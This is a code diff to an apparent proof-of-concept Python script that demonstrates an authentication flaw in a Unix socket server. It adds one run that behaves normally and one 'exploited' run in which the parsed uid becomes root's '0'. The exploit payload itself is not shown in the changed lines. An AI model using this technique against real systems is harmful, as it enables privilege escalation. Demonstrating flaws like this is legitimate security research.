@@ -25,7 +25,7 @@ def parse_authentication(auth_string):
             uid = token.split('=')[1]
         elif token.startswith('socket='):
             socket = token.split('=')[1]
-    print("[SRV] Parsed Auth: pid={} uid={} socket={}".format(pid, uid, socket))
+    print("[SRV] Parsed Auth: \n\tpid={} \n\tuid={} \n\tsocket={}".format(pid, uid, socket))
 
 def run_server():
 
@@ -137,8 +137,11 @@ def run_client_on_named_socket():
         print("[CLI] Closing socket")
         client_socket.close()
 
-if __name__ == '__main__':
+def run_non_exploited():
+    # Clean up any past runs
+    clean_up()
 
+    print("[*] Running code as intended without exploiting flaw.")
     # Start the server socket
     server_thread = threading.Thread(target=run_server)
     server_thread.start()
@@ -152,9 +155,41 @@ if __name__ == '__main__':
     # Wait for server socket thread to finish
     server_thread.join()
 
-    # Clean up
-    if os.path.isfile(SERVER_ADDR):
-        os.unlink(SERVER_ADDR)
+def run_exploited():
+    # Clean up any old runs
+    clean_up()
 
-    if os.path.isfile(CLIENT_ADDR):
+    print("[*] Running code exploiting flaw.")
+    # Start the server socket
+    server_thread = threading.Thread(target=run_server)
+    server_thread.start()
+
+    # Sleep for a second to give the server time to start up
+    time.sleep(1)
+
+    # Run the client socket
+    run_client_on_named_socket()
+
+    # Wait for server socket thread to finish
+    server_thread.join()
+
+def clean_up():
+    if os.path.exists(SERVER_ADDR):
+        os.unlink(SERVER_ADDR)
+    if os.path.exists(CLIENT_ADDR):
         os.unlink(CLIENT_ADDR)
+
+if __name__ == '__main__':
+
+    print("[*] NOTICE: In order to see the flaw in action")
+    print("[*] you must be running as a user other than root.")
+    print("[*] On the first run you will see your uid as the")
+    print("[*] uid parsed out of the auth string. On the second")
+    print("[*] run the uid parsed out will be that of root '0'.")
+
+    # First run code without exploiting
+    run_non_exploited()
+    time.sleep(1)
+
+    # Second run code with exploit
+    run_exploited()
